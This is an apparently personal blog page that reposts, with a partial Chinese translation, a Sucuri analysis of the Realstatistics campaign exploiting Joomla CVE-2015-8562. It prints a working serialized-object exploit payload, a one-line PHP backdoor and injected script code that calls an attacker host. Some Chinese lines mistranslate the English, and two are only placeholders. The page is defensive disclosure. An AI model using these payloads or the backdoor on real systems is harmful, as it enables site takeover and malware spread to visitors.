<!DOCTYPE html>
<html lang="en">

<head>

    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="description" content="">
    <meta name="author" content="">

    <title>Joomla CVE-2015-8562</title>

    <!-- Bootstrap Core CSS -->
    <link href="../css/bootstrap.min.css" rel="stylesheet">

    <!-- Custom CSS -->
    <link href="../css/sb-admin.css" rel="stylesheet">

    <!-- Morris Charts CSS -->
    <link href="../css/plugins/morris.css" rel="stylesheet">

    <!-- Custom Fonts -->
    <link href="../font-awesome/css/font-awesome.min.css" rel="stylesheet" type="text/css">

    <!-- highlight.js -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.5.0/styles/ir_black.min.css">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.5.0/highlight.min.js"></script>
    <script>hljs.initHighlightingOnLoad();</script>

    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
    <!--[if lt IE 9]>
        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
    <![endif]-->

</head>

<body>

    <div id="wrapper">

        <!-- Navigation -->
        <nav class="navbar navbar-inverse navbar-fixed-top" role="navigation">
            <!-- Brand and toggle get grouped for better mobile display -->
            <div class="navbar-header">
                <button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".navbar-ex1-collapse">
                    <span class="sr-only">Toggle navigation</span>
                    <span class="icon-bar"></span>
                    <span class="icon-bar"></span>
                    <span class="icon-bar"></span>
                </button>
                <a class="navbar-brand" href="../index.html">打鐵鋪</a>
            </div>
 

            <!-- Sidebar Menu Items - These collapse to the responsive navigation menu on small screens -->
            <div class="collapse navbar-collapse navbar-ex1-collapse">
                <ul class="nav navbar-nav side-nav">
                    <li>
                        <a href="../index.html"><i class="fa fa-fw fa-dashboard"></i> Index</a>
                    </li>
                    <li>
                        <a href="../AboutMe.html"><i class="fa fa-fw fa-edit"></i> About Me</a>
                    </li>
                    <li  class="active">
                        <a href="../Web.html"><i class="fa fa-fw fa-desktop"></i> Web Security</a>
                    </li>
                    <li>
                        <a href="../Reverse.html"><i class="fa fa-fw fa-wrench"></i> Reverse</a>
                    </li>
                    <li>
                        <a href="../Translate.html"><i class="fa fa-fw fa-file"></i> Translate</a>
                    </li>
                    <li>
                        <a href="../Note.html"><i class="fa fa-fw fa-table"></i> Note</a>
                </ul>
                    </li>
            </div>
            <!-- /.navbar-collapse -->
        </nav>

        <div id="page-wrapper">

            <div class="container-fluid">

                <!-- Page Heading -->
                <div class="row">
                    <div class="col-lg-12">
                        <ol class="breadcrumb">
                            <li>
                                <i class="fa fa-dashboard"></i>  <a href="index.html">Blog</a>
                            </li>
                            <li class="active">
                                <i class="fa fa-fw fa-file"></i>  <a href="../Web.html">Web</a>
                            </li>
                            <li class="active">
                                New Realstatistics Attack Vector Compromising Joomla Sites.
                            </li>
                        </ol>
                    </div>
                </div>
                <!-- /.row -->

                <div class="row">
                    <div class="jumbotron">
                    <h2 class="page-header">
                    New Realstatistics Attack Vector Compromising Joomla Sites<br>
                    新的
                    </h2>
                    </div>
                </div>

                <div class="row">
                <div class="col-lg-4"></div>
                <div class="col-lg-4">
                    <p class="lead">
                    文章原文轉自 :
                    <a target="_blank" href="https://blog.sucuri.net/2016/07/new-realstatistics-attack-vector-compromising-joomla-sites.html">blog.sucuri.net</a>
                     
                    </p>
                </div>
                <div class="col-lg-4"></div>
                </div>

            <!-- Img    -->
            <div class="row">
                <div class="col-lg-2"></div>
                    <div class="col-lg-8">
                        <img class="img-thumbnail" src="2016-08-15/joomla.jpg" >
                    </div>
                <div class="col-lg-2"></div>
            </div>
            <!-- Img End-->
            <br>

            <!-- 01        -->
                <div class="row">
                    <div class="col-lg-6">
                    <p class="lead">
                        Over the past few weeks we’ve seen a large number of Joomla websites compromised with the<a target="_blank" href="https://blog.sucuri.net/2016/07/joomla-wordpress-affected-by-realstatistics-infection-campaign-distributing-randsomware-malware.html"> Realstatistics malware campaign</a>. This mass infection is still evolving and continues to distribute harmful ransomware to compromised website visitors.
                    </p>
                    </div>
                    <div class="col-lg-6">
                    <p class="lead">
                        在我們公開 <a target="_blank" href="https://blog.sucuri.net/2016/07/joomla-wordpress-affected-by-realstatistics-infection-campaign-distributing-randsomware-malware.html">Realstatistics malware campaign</a> 這篇關於 Joomla 網站文章後的幾個禮拜，這種大規模的感染，仍然再不斷勒索跟繼續感染網站用戶。
                    </p>
                    </div>
                </div>
            <!-- 01 End -->
            <!-- 02        -->
                <div class="row">
                    <div class="col-lg-6">
                    <p class="lead">
                        Today we are providing more context on the new attack vector and exploitation process used to to compromise these sites.
                    </p>
                    </div>
                    <div class="col-lg-6">
                    <p class="lead">
                        今天我們將提供更多關於新的攻擊思維跟發生原因。
                    </p>
                    </div>
                </div>
            <!-- 02 End -->
            <!-- 03     -->
                <div class="row">
                <div class="col-lg-4"></div>
                <div class="col-lg-4">
                
                    <p class="lead">
                    <h3>
                    <b>
                        Joomla <a target="_blank" href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-8562">CVE-2015-8562 </a>
                        </b>
                    </h3>
                    </p>
                
                </div>
                <div class="col-lg-4"></div>
                </div>
            <!-- 03 End -->
            <!-- 04        -->
                <div class="row">
                    <div class="col-lg-6">
                    <p class="lead">
                        The initial attack vector is a variation of the <a target="_blank" href="https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html"> Remote Command Execution vulnerability in Joomla</a> that was heavily exploited at the end of last year. Despite the fact that it has been patched, we still see many attempts to exploit this vulnerability using the original methods we disclosed. Almost all web application firewalls have now virtually patched this variation of the exploit. As a result, we see fewer successful attempts at compromising Joomla sites with this older vulnerability.
                    </p>
                    </div>
                    <div class="col-lg-6">
                    <p class="lead">
                        最一開始的攻擊兒且很嚴重的exploit 版本是前年的<a target="_blank" href="https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html"> Remote Command Execution vulnerability in Joomla</a>。 儘管在幾年已經被修復了，我們直到今天仍然可以看到有人嘗試用我們發布的這個 expoit 版本 來攻擊網頁。現在幾乎大部分的WAF(Web Application Firewall) 都修補掉這個exploit，但也是因為這理由，我們目前仍然可以看到有一些少數還沒修補好的舊 Joomla 版本仍有此漏洞。
                    </p>
                    </div>
                </div>
            <!-- 04 End -->
            <!-- 06        -->
                <div class="row">
                    <div class="col-lg-6">
                    <p class="lead">
                        The new variation we discovered is using a new vector with the <b>filter-search option</b> which hasn’t yet been disclosed.  This results in a far higher success rate, and has a lot to do with why the Realstatistics malware campaign is successful in <b>compromising a high number of sites in such a short period of time<b>.
                    </p>
                    </div>
                    <div class="col-lg-6">
                    <p class="lead">
                        我們發現這版本有新變種的版本<b>filter-search option</b>，但我們目前還沒有公佈。因為這漏洞可以在<b>短時間內獲得大量的主機</b>。
                    </p>
                    </div>
                </div>
            <!-- 05 End -->
            <!-- 06        -->
                <div class="row">
                    <div class="col-lg-6">
                    <p class="lead">
                        New Attack Vector
                    </p>
                    </div>
                    <div class="col-lg-6">
                    <p class="lead">
                        新的攻擊方式
                    </p>
                    </div>
                </div>
            <!-- 06 End -->
            <!-- 07 Code    -->
                <div class="row">
                <div class="col-lg-12">
<pre>
<code class="html">
46.183.219.91 - - [19/Jun/2016:03:16:21 -0400] 
"POST /?option=com_tags HTTP/1.1" 403 4229 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.116 Safari/537.36" 
"POSTLOG:filter-search=bigus%7D__hxsjcurrrt%7CO%3A21%3A%22JDatabaseDriverMysqli%22%3A3%3A%7Bs%3A4%3A%22%5C0%5C0%5C0a%22%3BO%3A17%3A%22JSimplepieFactory%22%3A0%3A%7B%7Ds%3A21%3A%22%5C0%5C0%5C0disconnectHandlers%22%3Ba%3A1%3A%7Bi%3A0%3Ba%3A2%3A%7Bi%3A0%3BO%3A9%3A%22SimplePie%22%3A5%3A%7Bs%3A8%3A%22sanitize%22%3BO%3A20%3A%22JDatabaseDriverMysql%22%3A0%3A%7B%7Ds%3A5%3A%22cache%22%3Bb%3A1%3Bs%3A19%3A%22cache_name_function%22%3Bs%3A6%3A%22assert%22%3Bs%3A10%3A%22javascript%22%3Bi%3A9999%3Bs%3A8%3A%22feed_url%22%3Bs%3A71%3A%22eval%28base64_decode%28%24_SERVER%5B%27HTTP_QGYSD%27%5D%29%29%3BJFactory%3A%3AgetConfig%28%29%3Bexit%3B%22%3B%7Di%3A1%3Bs%3A4%3A%22init%22%3B%7D%7Ds%3A13%3A%22%5C0%5C0%5C0connection%22%3Bi%3A1%3B%7D\xF0\xFD\xFD\xFD"

</code>
</pre>
                </div>
                </div>
            <!-- 07 Code End -->
            <!-- 08        -->
                <div class="row">
                    <div class="col-lg-6">
                    <p class="lead">
                        As you can see from the date stamp, the initial vulnerability was exploited in June, but we didn’t see attempts to access the backdoor until the beginning of July:
                    </p>
                    </div>
                    <div class="col-lg-6">
                    <p class="lead">
                        如果看過這段惡意的data，它一開始是發生在六月，但在七月時我們從來沒有看過這段backdoor。
                    </p>
                    </div>
                </div>
            <!-- 08 End -->
            <!-- 09 Code    -->
                <div class="row">
                <div class="col-lg-12">
<pre>
<code class="html">
46.183.219.91 - - [01/Jul/2016:04:41:20 -0400] 
"POST /modules/cache.uniq_04793.php HTTP/1.1" 403 4261 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.116 Safari/537.36" 
"POSTLOG:&php_func=assert&php=print%28%22MY_S%22.%22UCCESS%22%29%3B"

</code>
</pre>
                </div>
                </div>
            <!-- 09 Code End -->
            <!-- 10        -->
                <div class="row">
                    <div class="col-lg-6">
                    <p class="lead">
                        With this request, attackers are simply testing whether the backdoor installation was successful or not.

                    </p>
                    </div>
                    <div class="col-lg-6">
                    <p class="lead">
                        這一段request，我們可以測試backdoor 有沒有成果安裝在上面。
                    </p>
                    </div>
                </div>
            <!-- 10 End -->
            <!-- 11        -->
                <div class="row">
                    <div class="col-lg-6">
                    <p class="lead">
                        The content of this backdoor is common to many backdoors we see:
                    </p>
                    </div>
                    <div class="col-lg-6">
                    <p class="lead">
                        我們可以看到這段後門的內容是 :
                    </p>
                    </div>
                </div>
            <!-- 11 End -->
            <!-- 12 Code    -->
                <div class="row">
                <div class="col-lg-12">
<pre>
<code class="php">
&lt;?php if(isset($_POST["php_func"])){@$_POST["php_func"](stripslashes($_POST["php"]));};?&gt;

</code>
</pre>
                </div>
                </div>
            <!-- 12 Code End -->
            <!-- 13        -->
                <div class="row">
                    <div class="col-lg-5"></div>
                    <div class="col-lg-4">
                
                        <p class="lead">
                        <h2>
                        <b>
                            Payload
                        </h2>
                        </p>
                
                    </div>
                    <div class="col-lg-3"></div>
                </div><br>
            <!-- 13 End -->
            <!-- 14        -->
                <div class="row">
                    <div class="col-lg-6">
                    <p class="lead">
                        After the attempts to see whether the backdoor was successful or not, attackers attempt to inject the payload utilizing the backdoor.

                    </p>
                    </div>
                    <div class="col-lg-6">
                    <p class="lead">
                        在這個步驟我們可以確認我們backdoor 是否有注入payload 成功
                    </p>
                    </div>
                </div>
            <!-- 14 End -->
            <!-- 15 Code    -->
                <div class="row">
                <div class="col-lg-12">
<pre>
<code class="html">
46.183.219.91 - - [01/Jul/2016:09:35:27 -0400] 
"POST /modules/cache.uniq_04793.php HTTP/1.1" 403 4261 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.116 Safari/537.36" 
"POSTLOG:&php_func=assert&php=assert%28base64_decode%28str_rot13%28%27MKMuoPuvLKAyAwEsMTIwo2EyXUA0py9lo3DkZltaHHEwnaO6rJukHR52EwWWAHDlqKyZZzqHpUb5nUSDIwqEETWOHUMSHxIVI0ySoGOgDzbjJRAgAQuQZ09vpR4jJSSRLauhFwIxFmWOnH1HFUEQEx5uD1IOq3O6rJckHR9zGRb1LKSXH2SAEmO2EacGZxkWDKqjraydpIOJqUSIrJcAEmO2pIEWAUSDBIuZF011FQWOoT5YGmOJqx9gpUcnBIM6qGOkIH42JJj5oR1XH2MjZ0I1pIE5oKSHrKqjoQIdpUb4nJ5uJzyZFwI1o1I5ZT5XDJ1M….”

</code>
</pre>
                </div>
                </div>
            <!-- 15 Code End -->
            <!-- 16        -->
                <div class="row">
                    <div class="col-lg-6">
                    <p class="lead">
                        That is just part of the <b>encoded payload</b> in the request above, but after decoding the <b>full payload</b> this is the result:
                    </p>
                    </div>
                    <div class="col-lg-6">
                    <p class="lead">
                        在這邊我們先encode 一部分得payload，再之後會解密掉全部的payload。
                    </p>
                    </div>
                </div>
            <!-- 16 End -->
            <!-- 17 Code    -->
                <div class="row">
                <div class="col-lg-12">
<pre>
<code class="html">
print "KeyCheckFront";
...

$inj_code = '&lt;script language="JavaScript" type="text/JavaScript" 

src="hxxp://realstatistics[.]pro/js/analytics.php?id=123"&gt;&lt;/script&gt;';

//$inj_code = '&lt;!-- lol777 --&gt;';

$inj_search = '&lt;/head&gt;';
...

</code>
</pre>
                </div>
                </div>
            <!-- 17 Code End -->
            <!-- 18        -->
                <div class="row">
                    <div class="col-lg-6">
                    <p class="lead">
                        As you can see from the code, the payload is injecting fake Realstatistics analytics code into the head section of any PHP template on the site.
                    </p>
                    </div>
                    <div class="col-lg-6">
                    <p class="lead">
                        當我們看到這段payload code，我們會發現假的Realstatistics analytics code 已經在我們網站得PHP 樣版裡。
                    </p>
                    </div>
                </div>
            <!-- 18 End -->
            <!-- 19        -->
                <div class="row">
                    <div class="col-lg-6">
                    <p class="lead">
                        <b>
                        Check Your Joomla Sites
                        </b>
                    </p>
                    </div>
                    <div class="col-lg-6">
                    <p class="lead">
                        <b>
                        確認你得Joomla 網站
                        </b>
                    </p>
                    </div>
                </div>
            <!-- 19 End -->
            <!-- 20     -->
                <div class="row">
                    <div class="col-lg-6">
                    <p class="lead">
                        This infection is only impacting unpatched Joomla sites, so make sure that your Joomla sites are up-to-date. This is a new attack vector on an old vulnerability, so if you can’t patch, you should be sure your website firewall is virtually patching this new variation.
                    </p>
                    </div>
                    <div class="col-lg-6">
                    <p class="lead">
                        這段payload 只會確認是不是還沒path 過的Joomla，所以趕快確認你的Joolma 有沒有Update。這是一個新版的攻擊思維，所以當你發現你的Joolma 還沒有修補，你應該確認你的WAF (Website Application Firewall)，有沒有此漏洞的相關Patch。
                    </p>
                    </div>
                </div>
            <!-- 20 End -->
            <!-- 21     -->
                <div class="row">
                    <div class="col-lg-6">
                    <p class="lead">
                        We recommend checking your logs for requests from 46 .183 .219 .91 – if you find requests similar to the ones in this post, consider your website compromised. At this point you should take steps to remove the malware immediately and prevent reinfection.
                    </p>
                    </div>
                    <div class="col-lg-6">
                    <p class="lead">
                        中文翻譯
                    </p>
                    </div>
                </div>
            <!-- 21 End -->
            <!-- 22        -->
                <div class="row">
                    <div class="col-lg-6">
                    <p class="lead">
                        If you are using our <a target="_blank" href="https://sucuri.net/website-firewall/"> CloudProxy Website Firewall</a>, your site is protected against this vulnerability through our virtual patching feature.  <a target="_blank" href="https://sucuri.net/website-antivirus/"> Our incident response team</a> is always standing by ready to assist you in cleaning and protecting your site if you need assistance.
                    </p>
                    </div>
                    <div class="col-lg-6">
                    <p class="lead">
                        中文翻譯
                    </p>
                    </div>
                </div>
            <!-- 22 End -->

            <!-- /.container-fluid -->

        </div>
        <!-- /#page-wrapper -->

    </div>
    <!-- /#wrapper -->

    <!-- jQuery -->
    <script src="../js/jquery.js"></script>


    <!-- Bootstrap Core JavaScript -->
    <script src="../js/bootstrap.min.js"></script>

    <!-- Morris Charts JavaScript -->
    <script src="../js/plugins/morris/raphael.min.js"></script>
    <script src="../js/plugins/morris/morris.min.js"></script>
    <script src="../js/plugins/morris/morris-data.js"></script>

</body>

</html>
